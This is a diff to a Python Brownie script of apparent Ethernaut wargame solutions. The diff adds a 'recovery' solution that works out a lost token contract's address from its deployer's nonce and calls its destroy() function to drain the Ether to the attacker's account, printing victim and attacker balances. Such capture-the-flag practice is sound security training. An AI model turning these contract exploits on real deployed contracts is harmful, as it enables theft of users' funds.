@@ -1,13 +1,14 @@
 from brownie import Fallback, Fallout, CoinFlip, CoinFlipAttacker, Telephone, TelephoneAttacker, TokenThing, Delegation, Delegate, Force, network, config, accounts, Contract
-from brownie import AttackForce, Vault, King, AttackKing, Reentrance, AttackReentrancy, Elevator, AttackElevator, Privacy
+from brownie import AttackForce, Vault, King, AttackKing, Reentrance, AttackReentrancy, Elevator, AttackElevator, Privacy, Recovery
 from brownie.network.gas.strategies import GasNowStrategy
 from brownie.network import gas_price
 from scripts.helpful_scripts import *
 import time
 from web3.auto.infura import w3
+from web3 import Web3, EthereumTesterProvider
 import os
 from brownie import Wei, AttackPrivacy, GatekeeperOne, AttackGatekeeperOne, GatekeeperTwo, AttackGatekeeperTwo
-from brownie import NaughtCoin, Preservation, AttackPreservation
+from brownie import NaughtCoin, Preservation, AttackPreservation, SimpleToken
 
 
 
@@ -295,6 +296,36 @@ def preservation():
     preservation.setFirstTime(attacker.address, {"from":account.address}).wait(1)
     print(f"After attack...Owner: {preservation.owner()}")
 
+def recovery():
+    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
+        print("This test is for fork/testnet use only. I don't feel like deploying manually.")
+        return
+
+    account = get_account()
+    recovery = deploy_contract(Recovery, "Recovery", 1, [])
+
+    w3 = Web3(Web3.HTTPProvider(f"https://rinkeby.infura.io/v3/{os.getenv('WEB3_INFURA_PROJECT_ID')}"))
+    print("Connected: " + str(w3.isConnected()))
+
+    # We are initially given the instance address of the Recovery contract
+    # The SimpleToken contract was deployed within the Recovery contract
+    # so we use the Recovery instance address to calculate the first deployed contract by setting the nonce to 1
+
+    simpleToken_contract_address = get_contract_address(recovery.address, 1) # we're setting nonce (the # of transactions that came from the address that deployed the contract) as 1
+    print(simpleToken_contract_address)
+    simpleTokenInstance = Contract.from_abi("SimpleToken", simpleToken_contract_address, SimpleToken.abi)
+
+    # now we call the destroy() function to withdrawl the 0.001 Ether
+    print(f"Before attack...victim balance: {w3.fromWei(w3.eth.get_balance(simpleTokenInstance.address), 'ether')}, attacker balance: {w3.fromWei(w3.eth.get_balance(account.address), 'ether')}")    
+    simpleTokenInstance.destroy(account.address, {"from":account.address}).wait(1)
+
+    # note: in fork this 'after balance' won't reflect the hack since it's getting the balance from the rinkeby branch, not your fork
+    print(f"After attack...victim balance: {w3.fromWei(w3.eth.get_balance(simpleTokenInstance.address), 'ether')}, attacker balance: {w3.fromWei(w3.eth.get_balance(account.address), 'ether')}")    
+
+
+
+
+
 
 
 
@@ -318,4 +349,5 @@ def main():
     #deploy_gatekeeperone()
     #deploy_gatekeepertwo()
     #naughtcoin()
-    preservation()
+    #preservation()
+    recovery()
